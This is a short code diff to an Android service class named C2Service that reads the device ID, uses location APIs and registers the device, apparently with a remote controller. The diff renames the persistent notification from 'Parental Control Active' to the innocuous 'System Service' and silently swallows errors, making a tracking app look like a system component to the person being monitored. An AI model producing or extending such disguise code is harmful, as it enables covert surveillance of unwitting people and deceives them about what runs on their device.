@@ -5,7 +5,6 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
-import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationManager;
 import android.os.Build;
@@ -30,17 +29,19 @@ public class C2Service extends Service {
         
         androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel("fg_channel", "Service", NotificationManager.IMPORTANCE_LOW);
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            if (manager != null) manager.createNotificationChannel(channel);
-            
-            Notification notification = new Notification.Builder(this, "fg_channel")
-                    .setContentTitle("Parental Control Active")
-                    .setSmallIcon(android.R.drawable.ic_menu_mylocation)
-                    .build();
-            startForeground(1, notification);
-        }
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel channel = new NotificationChannel("fg_channel", "Service", NotificationManager.IMPORTANCE_LOW);
+                NotificationManager manager = getSystemService(NotificationManager.class);
+                if (manager != null) manager.createNotificationChannel(channel);
+                
+                Notification notification = new Notification.Builder(this, "fg_channel")
+                        .setContentTitle("System Service")
+                        .setSmallIcon(android.R.drawable.ic_menu_mylocation)
+                        .build();
+                startForeground(1, notification);
+            }
+        } catch (Exception e) { }
 
         registerDevice();
 
